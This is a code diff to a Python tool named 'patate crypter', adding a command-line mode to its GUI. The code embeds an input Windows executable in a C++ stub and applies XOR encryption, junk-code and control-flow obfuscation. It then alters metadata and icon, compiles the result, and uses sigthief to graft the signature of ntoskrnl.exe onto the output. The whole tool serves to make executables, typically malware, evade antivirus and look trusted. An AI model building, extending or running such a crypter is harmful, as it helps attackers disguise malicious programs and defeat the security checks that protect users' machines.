@@ -38,14 +38,20 @@ from obfuscation import obfuscate
 from metadata import change_metadata
 import os, shutil, glob
 import pefile
+import argparse
 
 class Ui_mainWindow(object):
     def __init__(self) :
+        self.climode = False
         self.xor = False
         self.cflow = False
         self.junk = False
         self.filepath = ""
         self.icon_path = ""
+        self.filename = ""
+        self.xor_key = ""
+        self.junk_pass = 0
+        self.cflow_pass = 0
         
     def setupUi(self, mainWindow):
         mainWindow.setObjectName("mainWindow")
@@ -144,15 +150,22 @@ class Ui_mainWindow(object):
     def generate(self) :
         is_64bit = False
         in_filename = self.filepath
-        out_filename = "../bin/" + self.pushButton.text().split(".")[0] + "_out.exe"
+        out_filename = "../bin/" + self.filename + "_out.exe"
         xor_key = ''
 
         if self.xor :
-            xor_key = self.lineEdit.text()
+            if self.xor_key != "" :
+                xor_key = self.xor_key
+            else :
+                xor_key = self.lineEdit.text()
         
-        self.label_2.show()
+        if not self.climode :
+            self.label_2.show()
         
         if not os.path.exists(in_filename):
+            if self.climode :
+                print(f"\"{in_filename}\" does not exist!")
+                return
             self.label_2.setText(f"\"{in_filename}\" does not exist!")
             QCoreApplication.processEvents()
             return
@@ -160,19 +173,31 @@ class Ui_mainWindow(object):
         try :
             pe = pefile.PE(in_filename)
         except :
+            if self.climode :
+                print("File is not a binary.")
+                return
             self.label_2.setText("File is not a binary.")
             QCoreApplication.processEvents()
             return
         if hex(pe.FILE_HEADER.Machine) == '0x14c':
-            self.label_2.setText("File is a 32-bit binary")
+            if self.climode :
+                print("File is a 32-bit binary")
+            else :
+                self.label_2.setText("File is a 32-bit binary")
         else:
-            self.label_2.setText("File is a 64-bit binary")
+            if self.climode :
+                print("File is a 64-bit binary")
+            else :
+                self.label_2.setText("File is a 64-bit binary")
             is_64bit = True
-        QCoreApplication.processEvents()
+        if not self.climode :
+            QCoreApplication.processEvents()
 
-        self.label_2.setText("Creating sample header...")
-        QCoreApplication.processEvents()
-        
+            self.label_2.setText("Creating sample header...")
+            QCoreApplication.processEvents()
+        else :
+            print("Creating sample header...")
+            
         print(f"Filename : {in_filename}")
         file = bytearray(open(in_filename, 'rb').read())
         with open("../Crypter/sample.h", 'w') as output:
@@ -187,8 +212,11 @@ class Ui_mainWindow(object):
                     
             output.write("};")
         
-        self.label_2.setText("done.")
-        QCoreApplication.processEvents()
+        if self.climode :
+            print("done.")
+        else :
+            self.label_2.setText("done.")
+            QCoreApplication.processEvents()
         
         # Working with a copy of main.cpp
         os.rename("../Crypter/main.cpp", "../Crypter/DO_NOT_TOUCH.cpp")
@@ -197,21 +225,35 @@ class Ui_mainWindow(object):
         with open("../Crypter/config.h", "w") as c :
             c.write(f'#pragma once\n#define KEY "{xor_key}"')
         
-        self.label_2.setText("Adding junk code...")
-        QCoreApplication.processEvents()
-        obfuscate(self.spinBox.value(), self.spinBox_2.value(), self.cflow, self.junk, is_64bit)
-        self.label_2.setText("done.")
-        QCoreApplication.processEvents()
+        if self.climode :
+            print("Adding junk code...")
+        else :
+            self.label_2.setText("Adding junk code...")
+            QCoreApplication.processEvents()
+        if self.climode :
+            obfuscate(self.junk_pass, self.cflow_pass, self.cflow, self.junk, is_64bit)
+        else :
+            obfuscate(self.spinBox.value(), self.spinBox_2.value(), self.cflow, self.junk, is_64bit)
+            self.label_2.setText("done.")
+            QCoreApplication.processEvents()
         
-        self.label_2.setText("Changing metadata...")
-        QCoreApplication.processEvents()
-        change_metadata(self.icon_path)
+        if self.climode :
+            print("Changing metadata...")
+            change_metadata(self.icon_path)
+        else :
+            self.label_2.setText("Changing metadata...")
+            QCoreApplication.processEvents()
+            change_metadata(self.icon_path)
         
-        self.label_2.setText("done.")
-        QCoreApplication.processEvents()
+        if self.climode :
+            print("done.")
+            print("Compiling...")
+        else :
+            self.label_2.setText("done.")
+            QCoreApplication.processEvents()
         
-        self.label_2.setText("Compiling...")
-        QCoreApplication.processEvents()
+            self.label_2.setText("Compiling...")
+            QCoreApplication.processEvents()
         
         vs_path = os.popen("\"%ProgramFiles(x86)%/Microsoft Visual Studio/Installer/vswhere.exe\" -nologo -latest -property installationPath").read().replace("\n","") #https://stackoverflow.com/questions/46223916/msbuild-exe-not-found-cmd-exe
         cmd_line = vs_path + "\\Msbuild\\Current\\Bin\\MSBuild.exe"
@@ -223,8 +265,11 @@ class Ui_mainWindow(object):
 
         
         if return_code :
-            self.label_2.setText("build failed.")
-            QCoreApplication.processEvents()
+            if self.climode :
+                print("Build failed.")
+            else :
+                self.label_2.setText("build failed.")
+                QCoreApplication.processEvents()
 
         # Cleaning up..
         os.remove("../Crypter/main.cpp")
@@ -241,13 +286,19 @@ class Ui_mainWindow(object):
                 pass
         
         if not return_code :
-            self.label_2.setText(f"--> {out_filename}")
-            QCoreApplication.processEvents()
+            if self.climode :
+                print(f"--> {out_filename}")
+            else :
+                self.label_2.setText(f"--> {out_filename}")
+                QCoreApplication.processEvents()
         else :
             return
         
-        self.label_2.setText("Signing the file...")
-        QCoreApplication.processEvents()
+        if self.climode :
+            print("Signing the file...")
+        else :
+            self.label_2.setText("Signing the file...")
+            QCoreApplication.processEvents()
         
         windir = os.getenv("WINDIR")
         cmd = f'python sigthief.py -i "{windir}\\System32\\ntoskrnl.exe" -t {out_filename} -o {out_filename.replace(".exe","")+"_signed"}.exe'
@@ -256,6 +307,9 @@ class Ui_mainWindow(object):
         os.remove(out_filename)
         os.rename(out_filename.replace(".exe","")+"_signed.exe", out_filename)
         
+        if self.climode :
+            print("done.")
+            return
         self.label_2.setText("done.")
         QCoreApplication.processEvents()
         
@@ -268,6 +322,7 @@ class Ui_mainWindow(object):
             # Display the selected file path in the QLineEdit
             self.pushButton.setText(filePath.split("/")[-1:][0])
             self.filepath = filePath
+            self.filename = filePath.split("/")[-1:][0]
             
     
     def IconfileDialog(self):
@@ -290,6 +345,42 @@ class Ui_mainWindow(object):
 
 if __name__ == "__main__":
     import sys
+    
+    if len(sys.argv) > 1 :
+        parser = argparse.ArgumentParser(description="patate crypter")
+        parser.add_argument('--file', type=str, required=True, help="Path to the file to be processed")
+        parser.add_argument('--xor', type=str, required=False, help="XOR key for encryption/decryption")
+        parser.add_argument('--junk', type=int, required=False, help="Number of junk passes")
+        parser.add_argument('--control_flow', type=int, required=False, help="Number of control flow passes")
+        parser.add_argument('--icon', type=str, required=False, help="Path to the icon file")
+        args = parser.parse_args()
+        
+        ui = Ui_mainWindow()
+        
+        if args.icon :
+            if not os.path.exists(args.icon):
+                print(f"Could not find icon file {args.icon}")
+            if args.icon[-4:] != ".ico" :
+                print("Icon should be a .ico file.")
+            ui.icon_path = args.icon 
+
+        ui.climode = True
+        ui.xor = args.xor != None
+        ui.cflow = args.control_flow != None
+        ui.junk = args.junk != None
+        ui.filepath = args.file
+        ui.filename = args.file.split("/")[-1:][0]
+        
+        if args.xor :
+            ui.xor_key = args.xor
+        if args.junk :
+            ui.junk_pass = args.junk
+        if args.control_flow :
+            ui.cflow_pass = args.control_flow
+        ui.generate()
+        
+        sys.exit()
+        
     app = QtWidgets.QApplication(sys.argv)
     mainWindow = QtWidgets.QMainWindow()
     ui = Ui_mainWindow()
